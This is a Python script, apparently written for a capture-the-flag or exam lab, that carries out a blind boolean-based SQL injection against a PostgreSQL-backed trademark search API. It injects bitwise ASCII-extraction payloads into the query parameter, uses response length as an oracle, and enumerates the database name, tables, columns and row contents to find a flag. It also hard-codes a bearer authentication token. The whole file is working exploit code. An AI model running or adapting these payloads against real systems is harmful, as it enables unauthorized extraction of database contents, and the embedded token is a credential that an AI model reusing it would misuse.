import requests
import urllib.parse

# Your actual request details
def send(payload):
    # URL-encode the payload (only the query part)
    encoded_payload = urllib.parse.quote(payload)
    burp0_url = f"https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks?query={encoded_payload}"
    burp0_headers = {
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjdWtlbUBnbWFpbC5jb20iLCJyb2xlIjoiY2xpZW50IiwiZXhwIjoxNzY1MTc2NTUyfQ.3y_eeueI9WmBGwBxDS5JH8QhbMUwuDNcUd7Labunefw",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ipkage.exam.cyberjutsu-lab.tech/search",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    r = requests.get(burp0_url, headers=burp0_headers, verify=True)
    # Use response length as oracle (adjust if needed)
    return len(r.text)

# ================== EXPLOIT FUNCTIONS ==================

def exploit_db_name():
    bit_masks = [128, 64, 32, 16, 8, 4, 2, 1]
    db_name = ""
    i = 1
    print("Database Name: ", end='', flush=True)
    while True:
        char_code = 0
        check_end = 0
        for j in bit_masks:
            payload = f"a%' AND ((SELECT ASCII(SUBSTRING(current_database(),{i},1)) & {j}) > 0)) -- -"
            if send(payload) != 41:  # adjust oracle value if needed
                char_code += j
                check_end += 1
        if check_end == 0:
            break
        character = chr(char_code)
        db_name += character
        print(character, end='', flush=True)
        i += 1
    print(f"\n[+] DB: {db_name}")
    return db_name

def exploit_table_name(offset=0):
    bit_masks = [128, 64, 32, 16, 8, 4, 2, 1]
    table_name = ""
    i = 1
    print(f"Table (offset={offset}): ", end='', flush=True)
    while True:
        char_code = 0
        check_end = 0
        for j in bit_masks:
            payload = f"a%' AND (((SELECT ASCII(SUBSTRING(table_name,{i},1)) FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET {offset}) & {j}) > 0)) -- -"
            if send(payload) != 41:
                char_code += j
                check_end += 1
        if check_end == 0:
            break
        character = chr(char_code)
        table_name += character
        print(character, end='', flush=True)
        i += 1
    return table_name

def exploit_all_tables():
    print("=== Extracting Tables ===")
    tables = []
    for offset in range(20):
        t = exploit_table_name(offset)
        if not t:
            break
        tables.append(t)
        print(f" → {t}")
    print(f"[+] All tables: {tables}")
    return tables

def exploit_column_name(table_name, offset=0):
    bit_masks = [128, 64, 32, 16, 8, 4, 2, 1]
    col_name = ""
    i = 1
    while True:
        char_code = 0
        check_end = 0
        for j in bit_masks:
            payload = f"a%' AND (((SELECT ASCII(SUBSTRING(column_name,{i},1)) FROM information_schema.columns WHERE table_name='{table_name}' ORDER BY ordinal_position LIMIT 1 OFFSET {offset}) & {j}) > 0)) -- -"
            if send(payload) != 41:
                char_code += j
                check_end += 1
        if check_end == 0:
            break
        col_name += chr(char_code)
        i += 1
    return col_name

def exploit_all_columns(table_name):
    print(f"=== Columns in `{table_name}` ===")
    cols = []
    for offset in range(30):
        c = exploit_column_name(table_name, offset)
        if not c:
            break
        cols.append(c)
        print(f" → {c}")
    return cols

def exploit_column_value(table_name, column_name, row_offset=0):
    bit_masks = [128, 64, 32, 16, 8, 4, 2, 1]
    value = ""
    i = 1
    while True:
        char_code = 0
        check_end = 0
        for j in bit_masks:
            # Cast to text in case of non-string types (e.g., int, date)
            payload = f"a%' AND (((SELECT ASCII(SUBSTRING(({column_name})::text,{i},1)) FROM {table_name} LIMIT 1 OFFSET {row_offset}) & {j}) > 0)) -- -"
            if send(payload) != 41:
                char_code += j
                check_end += 1
        if check_end == 0:
            break
        value += chr(char_code)
        i += 1
    return value

def exploit_flag_from_table(table, column, max_rows=10):
    print(f"🔍 Searching flag in `{table}.{column}`...")
    for row in range(max_rows):
        val = exploit_column_value(table, column, row)
        if val and ("CBJS" in val or "flag" in val.lower()):
            print(f"\n🚩 FLAG FOUND (row {row}): {val}")
            return val
        elif val:
            print(f"[{row}] {val[:50]}...")
    return None

# ================== RUN EXPLOIT ==================

if __name__ == "__main__":
    # Step 1: Enumerate tables
    tables = exploit_all_tables()

    # Step 2: If "collaborations" exists, extract its columns
    if "collaborations" in tables:
        cols = exploit_all_columns("collaborations")
        # Step 3: Look for flag in likely columns
        for col in cols:
            if "content" in col.lower() or "note" in col.lower() or "desc" in col.lower():
                flag = exploit_flag_from_table("collaborations", col, max_rows=5)
                if flag:
                                       exit(0)
        # Also try common column names just in case
        for col in ["workspace_content", "content", "data", "secret", "note"]:
            if col in cols:
                flag = exploit_flag_from_table("collaborations", col, max_rows=5)
                if flag:
                    exit(0)
    
    # Optional: Also check trademarks table (e.g., in description)
    if "trademarks" in tables:
        cols_tm = exploit_all_columns("trademarks")
        for col in ["description", "owner_contact", "image_url"]:
            if col in cols_tm:
                flag = exploit_flag_from_table("trademarks", col, max_rows=10)
                if flag:
                    exit(0)

    print("\n[!] Flag not found. Try other tables/columns.")